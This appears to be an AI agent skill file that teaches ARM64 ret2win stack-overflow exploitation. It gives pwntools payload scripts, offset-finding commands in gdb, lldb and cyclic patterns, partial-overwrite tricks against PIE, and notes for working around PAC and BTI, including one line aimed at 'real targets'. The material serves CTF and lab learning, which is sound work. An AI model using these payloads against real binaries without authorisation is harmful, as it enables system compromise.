---
name: arm64-ret2win-exploitation
description: How to perform ARM64 stack overflow ret2win exploitation. Use this skill whenever the user mentions ARM64, AArch64, stack overflow, buffer overflow, ret2win, return address hijacking, or wants to exploit a binary on ARM64 architecture. This includes finding offsets, crafting payloads, handling PIE binaries, and working around modern hardening like PAC/BTI.
---

# ARM64 Ret2Win Exploitation

A skill for performing return-to-win stack overflow exploitation on ARM64 (AArch64) binaries.

## When to use this skill

Use this skill when:
- The user wants to exploit a stack buffer overflow on ARM64/AArch64
- The user needs to find the offset to overwrite the return address
- The user is working with ret2win challenges or similar return address hijacking scenarios
- The user needs to handle PIE (Position Independent Executable) binaries on ARM64
- The user is dealing with modern AArch64 hardening (PAC/BTI)
- The user is working on macOS with ARM64 binaries

## Core Concepts

### ARM64 Stack Layout

On ARM64, the stack frame typically looks like this:

```
Higher addresses
├── Saved x29 (frame pointer) - 8 bytes
├── Saved x30 (link register/return address) - 8 bytes ← TARGET
├── Local variables
└── buffer[64] - 64 bytes
Lower addresses
```

**Key facts:**
- `x30` (or `lr`) is the link register containing the return address
- `x29` is the frame pointer
- Functions save both with: `stp x29, x30, [sp, #-16]!`
- The saved return address is at `sp+8` relative to frame base
- For a 64-byte buffer: offset = 64 (buffer) + 8 (saved x29) = **72 bytes**
- Stack must remain 16-byte aligned at function boundaries

### Finding the Offset

#### Method 1: Using GEF (GDB Enhanced Features)

```bash
gdb -q ./binary
pattern create 200
run
# After crash:
pattern search $x30
```

#### Method 2: Using pwn cyclic patterns

```bash
python3 - << 'PY'
from pwn import *
print(cyclic(200).decode())
PY
```

Then after crash, find the offset:

```bash
python3 - << 'PY'
from pwn import *
print(cyclic_find(0x61616173))  # Replace with value from x30
PY
```

#### Method 3: Manual stack inspection

```bash
gdb -q ./binary
b *vulnerable_function + 0xc
run
info frame
# Note the stack address
b *vulnerable_function+28
c
# After read() executes, find where pattern is stored
# Calculate: pattern_address - buffer_start_address = offset
```

## Exploitation Scenarios

### Scenario 1: No PIE (Static Addresses)

When the binary is compiled without PIE (`-no-pie`), function addresses are fixed.

**Steps:**

1. Find the offset (typically 72 for 64-byte buffer)
2. Get the address of the target function:
   ```bash
   objdump -d binary | grep win
   # Look for: 00000000004006c4 <win>:
   ```
3. Craft the payload:
   ```python
   from pwn import *
   
   binary_name = './ret2win'
   p = process(binary_name)
   context.arch = 'aarch64'
   
   offset = 72
   ret2win_addr = p64(0x00000000004006c4)  # 8 bytes for ARM64
   payload = b'A' * offset + ret2win_addr
   
   p.send(payload)
   print(p.recvline())
   p.close()
   ```

### Scenario 2: PIE with Off-by-2

When PIE is enabled, you can sometimes use relative offsets if the return address is already close to the target.

**Steps:**

1. Find the offset (72)
2. Calculate the relative offset from the current return address to the target
3. Overwrite only the last 2 bytes:
   ```python
   from pwn import *
   
   binary_name = './ret2win'
   p = process(binary_name)
   
   offset = 72
   ret2win_addr = p16(0x07d4)  # Only last 2 bytes
   payload = b'A' * offset + ret2win_addr
   
   p.send(payload)
   print(p.recvline())
   p.close()
   ```

### Scenario 3: PIE with Address Leak

When you have an address leak, calculate the target address dynamically.

**Steps:**

1. Extract the leaked address from program output
2. Calculate the target function offset from the leaked function
3. Compute the runtime address
4. Craft the payload

See the bundled script `ret2win-exploit.py` for a complete example.

### Scenario 4: macOS ARM64

macOS has specific considerations:
- Cannot disable PIE
- Cannot disable NX (hardware-enforced)
- Use `DYLD_DISABLE_ASLR=1` to disable ASLR
- Use `lldb` instead of `gdb`

**Finding offset on macOS:**

```bash
# Generate pattern
python3 - << 'PY'
from pwn import *
print(cyclic(200).decode())
PY

# Run with lldb
lldb ./binary
(lldb) env DYLD_DISABLE_ASLR=1
(lldb) run
# Paste pattern
(lldb) register read x30

# Find offset
python3 - << 'PY'
from pwn import *
print(cyclic_find(0x61616173))  # From x30 value
PY
```

## Modern AArch64 Hardening

### PAC (Pointer Authentication Code)

If PAC is enabled, return addresses are authenticated. Check for it:

```bash
readelf --notes -W binary | grep AARCH64_FEATURE_1_PAC
objdump -d binary | grep -E 'paciasp|autiasp'
```

**Workarounds:**
- For learning: compile with `-mbranch-protection=none`
- For real targets: use non-return hijacks (function pointer overwrites) or ROP that avoids `autiasp`/`ret` pairs

### BTI (Branch Target Identification)

BTI requires landing pads at function entries. Check for it:

```bash
readelf --notes -W binary | grep AARCH64_FEATURE_1_BTI
objdump -d binary | grep 'bti c'
```

**Workarounds:**
- Target exact function entries with `bti c` instructions
- Avoid returning to arbitrary addresses

### Check Hardening Status

Use the bundled script `check-hardening.py` to quickly check for PAC/BTI:

```bash
python3 check-hardening.py ./binary
```

## Running on Non-ARM64 Hosts

If you're on x86_64 but want to practice ARM64 exploitation:

```bash
# Install qemu-user
sudo apt-get install qemu-user qemu-user-static libc6-arm64-cross

# Run the binary
qemu-aarch64 -L /usr/aarch64-linux-gnu ./ret2win

# Debug with GDB
qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu ./ret2win &
gdb-multiarch ./ret2win -ex 'target remote :1234'
```

## Common Pitfalls

1. **Wrong offset**: Always verify with pattern generation, don't guess
2. **Wrong address size**: ARM64 uses 8-byte addresses (`p64`), not 4-byte (`p32`)
3. **Stack alignment**: Keep SP 16-byte aligned for ROP chains
4. **PAC/BTI**: Check for these before attempting exploitation
5. **PIE**: Remember addresses are randomized at runtime

## Bundled Scripts

- `find-offset.py` - Generate cyclic patterns and find offsets
- `ret2win-exploit.py` - Template for ret2win exploitation with leak handling
- `check-hardening.py` - Check for PAC/BTI in binaries

## References

- [ARM64 Basic Assembly](../../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
- [AAPCS64 - Procedure Call Standard](https://github.com/ARM-software/abi-aa/blob/main/aapcs64/aapcs64.rst)
- [Enabling PAC and BTI on AArch64](https://community.arm.com/arm-community-blogs/b/operating-systems-blog/posts/enabling-pac-and-bti-on-aarch64-for-linux)
